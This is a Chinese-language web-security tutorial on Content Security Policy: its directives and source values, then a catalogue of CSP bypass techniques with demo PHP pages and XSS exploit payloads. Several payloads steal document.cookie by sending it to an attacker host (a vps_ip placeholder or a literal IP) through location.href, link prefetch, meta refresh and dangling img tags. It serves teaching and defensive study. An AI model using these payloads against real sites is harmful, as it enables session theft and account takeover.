XSS是最常见、危害最大的网页安全漏洞，想要抵御它们，要采取非常多编程措施，非常麻烦。那么，有没有可以从根本上解决问题，浏览器自动禁止外部注入恶意脚本的方法呢？CSP应运而生。

本文涉及相关实验：[XSS进阶之CSP绕过](https://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062017110316534000001&pk_campaign=freebuf-wemedia)（实验介绍了CSP防御机制的基本原理，利用script gadget绕过CSP，进而实施XSS攻击，并对攻击原理和过程进行分析。）

## 什么是CSP

CSP（Content Security
Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以

## CSP如何工作

 **通过响应包头（Response Header）实现：**

    
    
    Content-Security-policy: default-src 'self'; script-src 'self' allowed.com; img-src 'self' allowed.com; style-src 'self';

 **通过HTML 元标签实现：**

    
    
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">

### CSP指令

我们可以看出，有一部分是CSP中常用的配置参数指令，我们也是通过这些参数指令来控制引入源，下面列举说明：

> script-src：外部脚本
>
> style-src：样式表
>
> img-src：图像
>
> media-src：媒体文件（音频和视频）
>
> font-src：字体文件
>
> object-src：插件（比如 Flash）
>
> child-src：框架
>
> frame-ancestors：嵌入的外部资源（比如`<frame>`、`<iframe>`、`<embed>`和`<applet>`）
>
> connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）
>
> worker-src：worker脚本
>
> manifest-src：manifest 文件
>
> dedault-src：默认配置
>
> frame-ancestors：限制嵌入框架的网页
>
> base-uri：限制<base#href>
>
> form-action：限制<form#action>
>
> block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）
>
> upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议
>
> plugin-types：限制可以使用的插件格式
>
> sandbox：浏览器行为的限制，比如不能有弹出窗口等。

除了Content-Security-Policy，还有一个Content-Security-Policy-Report-Only字段，表示不执行限制选项，只是记录违反限制的行为。它必须与report-uri选项配合使用。

    
    
    Content-Security-Policy-Report-Only: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;

### CSP指令值

介绍完CSP的指令，下面介绍一下指令值，即允许或不允许的资源

> *： 星号表示允许任何URL资源，没有限制；
>
> self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；
>
> data：仅允许数据模式（如Base64编码的图片）方式加载资源；
>
> none：不允许任何资源被加载；
>
> unsafe-> inline：允许使用内联资源，例如内联`<script>`标签，内联事件处理器，内联`<style>`标签等，但出于安全考虑，不建议使用；
>
> nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；

下面通过具体的例子来看看CSP指令和指令值的用法：

> `<img
> src=image.jpg>`该图片来自[https://example.com](https://example.com/)将被允许载入，因为是同源资源；
>
> `<script
> src=script.js>`该js脚本来自[https://example.com](https://example.com/)将被允许载入，因为是同源资源；
>
> `<script
> src=https://examples.com/script.js>`，该js脚本将不允许被加载执行，因为来自[https://examples.com](https://examples.com/)，
> 非同源；

# CSP绕过

CSP从诞生时起即有安全研究人员所探索，本文总结部分方法

在开始之前，我们都可以将相应的CSP政策丢上Google 提供的 [CSP Evaluator](https://csp-evaluator.withgoogle.com/)检测一波，有奇效（手动滑稽）

### location.href绕过

href 属性是一个可读可写的字符串，可设置或返回当前显示的文档的完整 URL。

CSP不影响location.href跳转，因为在大多数网站中的跳转功能都是靠前端实现的，如果限制跳转将会使网站很大一部分功能受到影响，所以利用跳转来绕过CSP是一个万能的方法；或者存在`script-src 'unsafe-inline';`这条规则也可以用该绕过方法

#### demo

    
    
    <?php  
    if (!isset($_COOKIE['a'])) {  
    setcookie('a',md5(rand(0,1000)));  
    }  
    header("Content-Security-Policy: default-src 'self';");  
    ?>  
    <!DOCTYPE html>  
    <html>  
    <head>  
    <title>CSP Test</title>  
    </head>  
    <body>  
    <h2>CSP-safe</h2>  
    <?php  
    if (isset($_GET['a'])) {  
    echo "Your GET content".@$_GET['a'];  
    }//  
    ?>

![headImg.action?news=842eefee-b59b-4e66-b7ff-5390bbe119f3.png](https://image.3001.net/images/20210513/1620896207_609ce9cfd65edf293791d.png!small)

这个地方可以用location跳转：location.href(window.location/window.open)绕过

#### exp

    
    
    ?a=<script>location.href="http://127.0.0.1"+document.cookie;</script>

![headImg.action?news=1795f391-4e24-41cc-ae1e-88f473c344bf.png](https://image.3001.net/images/20210513/1620896208_609ce9d0cab3f086dee95.png!small)

在我们已经可以执行任意js脚本但由于CSP的阻拦我们的cookie无法带外传输，就可以用此方法

    
    
    location.href = "vps_ip:xxxx?"+document.cookie

可以执行任意js脚本，但由于CSP无法数据外带

CSP为`script-src 'unsafe-inline'﻿`

### link标签预加载导致的绕过

这是个老办法了，在大部分浏览器都已经约束了该标签，但是老浏览器可能还可行

    
    
    <!-- firefox -->  
    <link rel="dns-prefetch" href="//${cookie}.vps_ip">  
    ​  
    <!-- chrome -->  
    <link rel="prefetch" href="//vps_ip?${cookie}">

那我们该如何将数据外带呢

动态构建元素，再引发页面跳转

    
    
    var link = document.createElement("link");  
    link.setAttribute("rel", "prefetch");  
    link.setAttribute("href", "//vps_ip/?" + document.cookie);  
    document.head.appendChild(link);

这样就可以将cookie外带了

可以执行任意js脚本，但由于CSP无法外带数据

### meta网页跳转绕过

与link标签原理相似，利用meta标签实现网页跳转

    
    
    http://127.0.0.1/csp.php?xss==<meta http-equiv="refresh" content="1;url=http://150.158.188.194:7890/" >

![headImg.action?news=f7b44c4c-c8bc-4d33-a440-e9a627d20360.png](https://image.3001.net/images/20210513/1620896209_609ce9d1d2695c2a5614d.png!small)

除此之外，meta标签还有一些不常用的功能有时也能起奇效

meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。

    
    
    <meta http-equiv="cache-control" content="public">

meta可以设置Cookie（Firefox下），可以结合self-xss利用

    
    
    <meta http-equiv="Set-Cookie" Content="cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/">

`meta`这一被很多人忽略的标签，其实可以做到的东西也不少，后面有机会会进一步分析

### iframe绕过

iframe 元素会创建包含另外一个文档的内联框架（即行内框架），我们可以通过设置这个来做到一个跨域访问，这其中就有安全问题了，但是今天要用到的并不是这些

> 在CSP中，通过配置sandbox和child-> src可以设置iframe的有效地址，它限制适iframe的行为，包括阻止弹出窗口,防止插件和脚本的执行,而且可以执行一个同源策略。

 **同源**
这才是主角，当一个同源站点存在两个页面，我们称它们为A页面和B页面，假如A页面有CSP保护，而B页面没有，我们就可以直接在B页面新建`iframe`用js操作A页面的DOM，也就是说A页面的CSP防护完全失效

#### demo&exp

    
    
    <!-- A页面 -->  
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">  
    ​  
    <h1 id="flag">flag{0xffff}</h1>
    
    
    <!-- B页面 -->  
    ​  
    <!-- 下面模拟XSS -->  
    <body>  
    <script>  
    var iframe = document.createElement('iframe');  
    iframe.src="http://127.0.0.1/a.php";  
    document.body.appendChild(iframe);  
    setTimeout(()=>alert(iframe.contentWindow.document.getElementById('flag').innerHTML),1000);  
    </script>  
    </body>

![headImg.action?news=3600e133-b45a-4ef8-a153-216a52a474d9.png](https://image.3001.net/images/20210513/1620896210_609ce9d2f0447a92b582a.png!small)

setTimeout是为了等待iframe加载完成

你以为就这样就完了？那你果然和我一样天真了

在找CSP绕过相关资料时，还发现了个好玩的东西（[zhazhami师傅的博客](https://www.jianshu.com/p/f1de775bc43e)）

>
> 在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如"[http://xxx](http://xxx/)"页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。
>  
>  
>     <iframe csp="script-src 'unsafe-inline'" src="http://xxx"></iframe>

一个同源站点存在两个页面，其中一个有CSP保护，一个没有且存在xss漏洞

我们要的数据在存在CSP保护的页面中

### CDN绕过

一般来说，前端要用到许多的前端框架和库，而部分企业为了效率或者其他原因，会选择使用其他CDN上的js框架，当这些CDN上存在一些低版本的框架时，就可能存在绕过CSP的风险

这里借Orange大神绕过hackmd CSP的文章（[A Wormable XSS on
HackMD!](https://paper.seebug.org/855/)）来分析一波

#### demo

先来看hackmd的CSP策略

    
    
    content-security-policy: script-src 'self' vimeo.com https://gist.github.com www.slideshare.net https://query.yahooapis.com 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.mathjax.org https://www.google.com https://apis.google.com https://docs.google.com https://www.dropbox.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com https://stats.g.doubleclick.net https://secure.quantserve.com https://rules.quantcount.com https://pixel.quantserve.com https://js.driftt.com https://embed.small.chat https://static.small.chat https://www.googletagmanager.com https://cdn.ravenjs.com 'nonce-38703614-d766-4dff-954b-57372aafe8bd' 'sha256-EtvSSxRwce5cLeFBZbvZvDrTiRoyoXbWWwvEVciM5Ag=' 'sha256-NZb7w9GYJNUrMEidK01d3/DEtYztrtnXC/dQw7agdY4=' 'sha256-L0TsyAQLAc0koby5DCbFAwFfRs9ZxesA+4xg0QDSrdI='; img-src * data:; style-src 'self' 'unsafe-inline' https://assets-cdn.github.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com https://static.small.chat; font-src 'self' data: https://public.slidesharecdn.com https://cdnjs.cloudflare.com https://fonts.gstatic.com https://*.disquscdn.com; object-src *; media-src *; frame-src *; child-src *; connect-src *; base-uri 'none'; form-action 'self' https://www.paypal.com; upgrade-insecure-requests

看到了`unsafe-eval`这个关键字，可以想到Breaking XSS mitigations via Script
Gadgets手法，但我们继续往下看就会发现，其实没这么复杂，因为该CSP政策还允许了`https://cdnjs.cloudflare.com/`这个js
hosting服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助AngularJS 函数库以及Client-Side Template
Injection里面成熟的沙盒逃逸技术绕过

再因为原本WAF对注释的完全可信，可以构造出`<!-- foo="bar--><script>alert(1)</script>>"
-->`这一payload，用`-->`来闭合前面的注释，来让后面内容完全可控

两者结合，得出最终payload

#### exp

    
    
    <!-- foo="-->  
    <script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js>  
    </script>  
    <div ng-app>  
    {{constructor.constructor('alert(document.cookie)')()}}  
    </div>  
    //sssss" -->

详细内容看Orange师傅的文章

如果用了Jquery-mobile库，且CSP中包含"script-src 'unsafe-eval'"或者"script-src 'strict-dynamic'"，可以用此exp

    
    
    <div data-role=popup id='<script>alert(1)</script>'></div>

还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie

    
    
    <amp-pixel src="http://your domain/?cid=CLIENT_ID(FLAG)"></amp-pixel>

总而言之，这一绕过方法主要可以套用网上相应的payload格式来绕过CSP，在[Breaking XSS mitigations via Script
Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)中总结了可以被用来CDN绕过的一些JS库，可以用作参考

CDN服务商存在低版本的js库

该CDN服务商在CSP白名单中

### 站点可控静态资源绕过

给一个绕过codimd的(实例)[codimd
xss](https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_&_Bypass_CSP.md)

案例中codimd的CSP中使用了`www.google-analytics.com`而[www.google.analytics.com](http://www.google.analytics.com/)中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP

#### demo

    
    
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-eval' https://www.google-analytics.com">  
    <script src="https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64"></script>

#### exp

![headImg.action?news=49f8343b-a830-4193-9c43-416f44fc06bd.png](https://image.3001.net/images/20210513/1620896211_609ce9d3a359276475e13.png!small)

![headImg.action?news=206f0fb7-6e15-4041-a52b-fbefdec5f849.png](https://image.3001.net/images/20210513/1620896212_609ce9d4313e5d04cd83d.png!small)

同理，在其他站点提供了可控静态资源的功能时，且CSP中允许了此站点，就可以用该方式绕过

存在可控静态资源

站点在CSP允许名单中

### 不完整script标签绕过

我们先来了解一个小知识（敲黑板）：当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性

好，我们开搞

#### demo1

    
    
    <?php header("X-XSS-Protection:0");?>  
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-xxxxx'">  
    <?php echo $_GET['xss']?>  
    <script nonce='xxxxx'>  
    //do some thing  
    </script>

#### exp

当我们输入`http://127.0.0.1/2.php?xss=<script
src=data:text/plain,alert(1)`，我们可以发现`<script`就会被变成一个属性，值为空，之后的`nonce='xxxxx'`

会被当成我们输入的script标签中的一个属性，成功绕过`script-src`

![headImg.action?news=4e070444-2f99-4abc-988c-00c639c5d8b6.png](https://image.3001.net/images/20210513/1620896212_609ce9d4e986fe61029f0.png!small)

#### demo2

但是在chrome中，虽然第二个<script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行

#### exp

这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略

    
    
    <!-- 3.php -->  
    <h1 a="123" b="456" a="789" a="abc">123</h1>

于是我们可以输入`http://127.0.0.1/2.php?xss=123<script src="data:text/plain,alert(1)"
a=123
a=`先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个<script赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样exp就能成功在chrome浏览器上执行

可控点在合法script标签上方,且其中没有其他标签

XSS页面的CSP script-src只采用了nonce方式

### 不完整的资源标签获取资源

#### demo

    
    
    <meta http-equiv="Content-Security-Policy" content="default-src 'self';script-src 'self'; img-src *;">  
    <?php echo $_GET['xss']?>  
    <h1>flag{0xffff}</h1>  
    <h2 id="id">3</h2>

这里可以注意到`img`用了`*`,有些网站会用很多外链图片，所以这个情况并不少见，虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有`unsafe-inline`），于是我们可以用不完整的`<img`标签来将数据带出

#### exp

    
    
    http://127.0.0.1/csp.php?xss=<img src="//vps_ip?a=

此时由于我们传入的src的引号没有闭合，html解析器会一直寻找第二个引号，而直到”`id`“前的引号出现之前，所有内容都会被当作src的值发送到我们的vps上

![headImg.action?news=a28f12cf-9676-4458-948b-71e24c47ebc3.png](https://image.3001.net/images/20210513/1620896213_609ce9d5d4b8ba13409c1.png!small)

需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或<

可以加载外域资源 (img-src: *)

需要获取页面某处的信息

### 302（重定向）绕过

很多时候一个网站都会带有一个302跳转功能的页面,用它来导向到本站的资源或者是外部的链接
我们首先看一下w3c文档里关于重定向的说明<https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects>

很明显的,如果我们的script-src设置为某个目录,通过这个目录下的302跳转,是可以绕过csp读取到另一个目录下的脚本的。

接下来就来模拟分析一波

#### demo

    
    
    <!-- csp.php -->  
    <?php  
    header("Content-Security-Policy: default-src 'self';script-src http://127.0.0.1/a/");  
    ?>  
    ​  
    <html>  
    <head>  
    </head>  
    <body>  
    csp header test   
    </body>  
    </html>
    
    
    <!-- redirect.php -->  
    <?php  
    header("Location: " . $_GET[url]);  
    ?>
    
    
    <!-- test.php -->  
    <!DOCTYPE html>  
    <html>  
    <head>  
    <title>1</title>  
    </head>  
    <body>  
    123  
    </body>  
    </html>

csp限制了`/a/`目录，而我们的目标脚本在`/b/`目录下则如果这时候请求`redirect`页面去访问`/b/`下的脚本是可以通过csp的检查的

#### exp

    
    
    http://127.0.0.1/a/redirect.php?url=/b/test.php

![headImg.action?news=efc3250f-404c-4418-80e8-9cc0831864b9.png](https://image.3001.net/images/20210513/1620896219_609ce9db0554775b1edf0.png!small)

但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下(example.com)，也就是不可能通过302跳转去加载一个其他域下的脚本的，比如通过`a.com`的302跳转去加载`b.com`下的脚本是不可以

但！又来个但是了，在实际环境中，比如某个站调用某个cdn，或者类似于`script-src example.com/scripts/
google.com/recaptcha/`，`google.com/script/*`下有个`evil.js`，然后刚好站内有个重定向，漏洞条件就已经成立了。

在script-src允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录

在script-src允许的域下，存在某个任意文件的上传点（任意目录）

有特别的方式可以跨域发送请求，或者有站内域可以接受请求

